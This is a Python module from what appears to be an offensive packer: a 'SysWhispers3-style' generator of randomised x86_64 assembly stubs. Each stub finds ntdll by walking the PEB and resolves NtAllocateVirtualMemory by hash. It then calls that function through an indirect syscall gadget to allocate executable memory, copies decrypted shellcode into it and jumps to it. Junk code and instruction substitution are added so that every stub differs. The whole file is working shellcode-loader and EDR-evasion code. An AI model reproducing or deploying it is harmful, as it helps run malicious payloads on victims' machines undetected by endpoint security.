"""SysWhispers3-style indirect syscall stub generator.

Generates x86_64 assembly that:
1. Walks PEB to find ntdll.dll base address
2. Parses ntdll export directory to resolve syscall service numbers (SSNs)
   using DJB2 hash comparison (no string literals)
3. Finds a syscall;ret gadget inside ntdll's code section
4. Invokes NtAllocateVirtualMemory via indirect syscall to allocate RWX memory
5. Copies decrypted shellcode to the new allocation
6. Transfers execution via jmp
"""

from __future__ import annotations

import random

from . import dead_code, instruction_subs as isub
from .register_allocator import RegisterSet, Role

# DJB2 hash of NtAllocateVirtualMemory (pre-computed, verified in tests)
HASH_NtAllocateVirtualMemory = 0x6793C34C


def generate_syscall_stub(
    regs: RegisterSet,
    payload_size: int,
    junk_density: int,
    rng: random.Random,
    decrypted_payload_label: str = "payload_start",
) -> list[str]:
    """Generate indirect syscall stub for memory allocation + execution."""
    lines: list[str] = []
    labels = _make_labels(rng)

    r_base = regs.r64(Role.NTDLL_BASE)
    r_base_32 = regs.r32(Role.NTDLL_BASE)
    r_gadget = regs.r64(Role.FUNC_ADDR)
    r_ssn = regs.r64(Role.SYSCALL_NUM)
    r_ssn_32 = regs.r32(Role.SYSCALL_NUM)
    r_tmp = regs.r64(Role.TEMP1)
    r_tmp_32 = regs.r32(Role.TEMP1)
    r_tmp2 = regs.r64(Role.TEMP2)
    r_tmp2_32 = regs.r32(Role.TEMP2)

    # ================================================================
    # PART 1: Find ntdll.dll base via PEB walk
    # ================================================================
    lines.append(f"{labels['find_ntdll']}:")
    lines.append(f"mov {r_base}, qword ptr gs:[0x60]")
    lines.extend(_junk(junk_density, rng, regs))
    lines.append(f"mov {r_base}, qword ptr [{r_base} + 0x18]")
    lines.extend(_junk(junk_density, rng, regs))
    lines.append(f"mov {r_base}, qword ptr [{r_base} + 0x20]")
    lines.extend(_junk(junk_density, rng, regs))
    lines.append(f"mov {r_base}, qword ptr [{r_base}]")
    lines.extend(_junk(junk_density, rng, regs))
    lines.append(f"mov {r_base}, qword ptr [{r_base} + 0x20]")
    lines.extend(_junk(junk_density, rng, regs))

    # ================================================================
    # PART 2: Find syscall;ret gadget (0F 05 C3) in ntdll
    # ================================================================
    lines.append(f"{labels['find_gadget']}:")
    lines.append(f"mov {r_gadget}, {r_base}")
    scan_loop = f"scan_{rng.randint(0x1000, 0xFFFF):x}"
    scan_found = f"found_gadget_{rng.randint(0x1000, 0xFFFF):x}"
    lines.append(f"{scan_loop}:")
    lines.extend(isub.increment(r_gadget, rng))
    lines.append(f"cmp word ptr [{r_gadget}], 0x050F")
    lines.append(f"jne {scan_loop}")
    lines.append(f"cmp byte ptr [{r_gadget} + 2], 0xC3")
    lines.append(f"jne {scan_loop}")
    lines.append(f"{scan_found}:")
    lines.extend(_junk(junk_density, rng, regs))

    # ================================================================
    # PART 3: Resolve SSN for NtAllocateVirtualMemory via export dir
    # ================================================================
    lines.append(f"{labels['resolve_ssn']}:")
    lines.extend(_generate_ssn_resolver(
        regs, rng, junk_density,
        target_hash=HASH_NtAllocateVirtualMemory,
    ))
    lines.extend(_junk(junk_density, rng, regs))
    # SSN is now in r_ssn (lower 32 bits)

    # ================================================================
    # PART 4: NtAllocateVirtualMemory indirect syscall
    # Save everything we need, then set up hardcoded regs for syscall
    # ================================================================
    lines.append(f"{labels['call_alloc']}:")

    # Save gadget and SSN to stack
    lines.append(f"push {r_ssn}")
    lines.append(f"push {r_gadget}")

    # Stack frame: shadow(32) + arg5(8) + arg6(8) + locals(16) = 0x50
    lines.append(f"sub rsp, 0x50")

    # BaseAddress local = 0
    lines.append(f"xor eax, eax")
    lines.append(f"mov qword ptr [rsp + 0x40], rax")

    # RegionSize local = payload_size
    lines.extend(isub.mov_imm("rax", payload_size, rng))
    lines.append(f"mov qword ptr [rsp + 0x38], rax")

    # Syscall args (x64 Windows: rcx, rdx, r8, r9, stack)
    lines.append(f"mov rcx, -1")                         # ProcessHandle = current
    lines.append(f"lea rdx, [rsp + 0x40]")               # &BaseAddress
    lines.append(f"xor r8d, r8d")                        # ZeroBits = 0
    lines.append(f"lea r9, [rsp + 0x38]")                # &RegionSize
    lines.extend(isub.mov_imm("rax", 0x3000, rng))       # MEM_COMMIT|MEM_RESERVE
    lines.append(f"mov qword ptr [rsp + 0x28], rax")
    lines.extend(isub.mov_imm("rax", 0x40, rng))         # PAGE_EXECUTE_READWRITE
    lines.append(f"mov qword ptr [rsp + 0x30], rax")

    # Load SSN: saved at [rsp + 0x50 + 8] = [rsp + 0x58]
    lines.append(f"mov eax, dword ptr [rsp + 0x58]")
    lines.append(f"mov r10, rcx")                         # syscall convention

    # Indirect syscall via gadget address at [rsp + 0x50]
    lines.append(f"call qword ptr [rsp + 0x50]")

    # After syscall: BaseAddress filled in
    lines.append(f"{labels['alloc_done']}:")
    lines.append(f"mov rdi, qword ptr [rsp + 0x40]")     # Allocated base
    lines.append(f"add rsp, 0x50")
    lines.append(f"add rsp, 0x10")                        # Pop saved gadget + ssn
    lines.extend(_junk(junk_density, rng, regs))

    # ================================================================
    # PART 5: Copy decrypted payload to RWX allocation
    # ================================================================
    lines.append(f"{labels['copy_payload']}:")
    lines.append(f"lea rsi, [{decrypted_payload_label}]")
    lines.extend(isub.mov_imm("rcx", payload_size, rng))
    lines.append(f"cld")
    lines.append(f"rep movsb")
    lines.extend(_junk(junk_density, rng, regs))

    # ================================================================
    # PART 6: Execute — jmp to copied shellcode
    # ================================================================
    lines.append(f"{labels['exec']}:")
    lines.append(f"sub rdi, {payload_size}")
    lines.append(f"jmp rdi")

    return lines


def _generate_ssn_resolver(
    regs: RegisterSet,
    rng: random.Random,
    junk_density: int,
    target_hash: int,
) -> list[str]:
    """Resolve an SSN from ntdll exports by DJB2 hash comparison.

    Uses r_tmp, r_tmp2, r_ssn from the register set.
    Also uses rax and ecx as scratch (hardcoded for specific ops).
    """
    r_base = regs.r64(Role.NTDLL_BASE)
    r_ssn = regs.r64(Role.SYSCALL_NUM)
    r_ssn_32 = regs.r32(Role.SYSCALL_NUM)
    r_tmp = regs.r64(Role.TEMP1)
    r_tmp_32 = regs.r32(Role.TEMP1)
    r_tmp2 = regs.r64(Role.TEMP2)
    r_tmp2_32 = regs.r32(Role.TEMP2)

    name_loop = f"name_loop_{rng.randint(0x1000, 0xFFFF):x}"
    hash_loop = f"hash_char_{rng.randint(0x1000, 0xFFFF):x}"
    hash_done = f"hash_done_{rng.randint(0x1000, 0xFFFF):x}"
    found_func = f"found_func_{rng.randint(0x1000, 0xFFFF):x}"

    lines: list[str] = []

    # Parse PE export directory
    # e_lfanew (DWORD) at base+0x3C
    lines.append(f"mov {r_tmp_32}, dword ptr [{r_base} + 0x3C]")
    lines.append(f"add {r_tmp}, {r_base}")
    # Export dir RVA at PE+0x88 (x64 optional header)
    lines.append(f"mov {r_tmp_32}, dword ptr [{r_tmp} + 0x88]")
    lines.append(f"add {r_tmp}, {r_base}")

    # Save export dir VA
    lines.append(f"push {r_tmp}")

    # NumberOfNames at export_dir + 0x18 — use r_ssn as loop counter temporarily
    lines.append(f"mov {r_ssn_32}, dword ptr [{r_tmp} + 0x18]")
    lines.append(f"push {r_ssn}")  # Save NumberOfNames

    # AddressOfNames RVA at export_dir + 0x20
    lines.append(f"mov {r_tmp2_32}, dword ptr [{r_tmp} + 0x20]")
    lines.append(f"add {r_tmp2}, {r_base}")

    # Index counter = 0
    lines.extend(isub.zero_register(r_ssn, rng))

    # === Name loop ===
    lines.append(f"{name_loop}:")
    lines.append(f"push {r_ssn}")    # Save index
    lines.append(f"push {r_tmp2}")   # Save AddressOfNames VA

    # Get name RVA: dword at [AddressOfNames + index*4]
    lines.append(f"mov eax, dword ptr [{r_tmp2} + {r_ssn} * 4]")
    lines.append(f"add rax, {r_base}")
    # rax = name string VA

    # DJB2 hash into r_tmp
    lines.extend(isub.mov_imm(r_tmp, 5381, rng))

    lines.append(f"{hash_loop}:")
    lines.append(f"movzx {r_ssn_32}, byte ptr [rax]")
    lines.append(f"test {regs.r8(Role.SYSCALL_NUM)}, {regs.r8(Role.SYSCALL_NUM)}")
    lines.append(f"jz {hash_done}")
    # hash = (hash << 5) + hash + c
    lines.append(f"mov {r_tmp2}, {r_tmp}")
    lines.append(f"shl {r_tmp}, 5")
    lines.append(f"add {r_tmp}, {r_tmp2}")
    lines.append(f"add {r_tmp}, {r_ssn}")
    # Truncate to 32-bit: use 32-bit mov to zero-extend
    lines.append(f"mov {r_tmp_32}, {r_tmp_32}")
    lines.extend(isub.increment("rax", rng))
    lines.append(f"jmp {hash_loop}")

    lines.append(f"{hash_done}:")
    # Compare with target hash
    lines.extend(isub.mov_imm("rax", target_hash, rng))
    lines.append(f"cmp {r_tmp_32}, eax")

    lines.append(f"pop {r_tmp2}")    # Restore AddressOfNames
    lines.append(f"pop {r_ssn}")     # Restore index
    lines.append(f"je {found_func}")

    # Next name
    lines.extend(isub.increment(r_ssn, rng))
    # Check against NumberOfNames on stack
    lines.append(f"cmp {r_ssn_32}, dword ptr [rsp]")
    lines.append(f"jb {name_loop}")

    # Not found fallback
    lines.append(f"int3")

    # === Found: resolve SSN from function prologue ===
    lines.append(f"{found_func}:")
    lines.append(f"pop rax")          # Discard NumberOfNames
    lines.append(f"pop {r_tmp}")      # Restore export dir VA

    # AddressOfNameOrdinals at export_dir + 0x24
    lines.append(f"mov eax, dword ptr [{r_tmp} + 0x24]")
    lines.append(f"add rax, {r_base}")
    # Ordinal = WORD at [NameOrdinals + index*2]
    lines.append(f"movzx eax, word ptr [rax + {r_ssn} * 2]")

    # AddressOfFunctions at export_dir + 0x1C
    lines.append(f"mov {r_tmp2_32}, dword ptr [{r_tmp} + 0x1C]")
    lines.append(f"add {r_tmp2}, {r_base}")
    # Function RVA = DWORD at [Functions + ordinal*4]
    lines.append(f"mov eax, dword ptr [{r_tmp2} + rax * 4]")
    lines.append(f"add rax, {r_base}")

    # Read SSN from function prologue:
    # ntdll Nt* stubs: mov r10, rcx; mov eax, <SSN> — SSN at func+4
    lines.append(f"mov {r_ssn_32}, dword ptr [rax + 4]")

    return lines


def _make_labels(rng: random.Random) -> dict[str, str]:
    s = lambda: f"{rng.randint(0x1000, 0xFFFF):x}"
    return {
        "find_ntdll": f"find_ntdll_{s()}",
        "find_gadget": f"find_gadget_{s()}",
        "resolve_ssn": f"resolve_ssn_{s()}",
        "call_alloc": f"call_alloc_{s()}",
        "alloc_done": f"alloc_done_{s()}",
        "copy_payload": f"copy_payload_{s()}",
        "exec": f"exec_{s()}",
    }


def _junk(density: int, rng: random.Random, regs: RegisterSet) -> list[str]:
    if density <= 0:
        return []
    count = rng.randint(0, density)
    return dead_code.generate_dead_code(count, rng, avoid_regs=regs.used_regs)
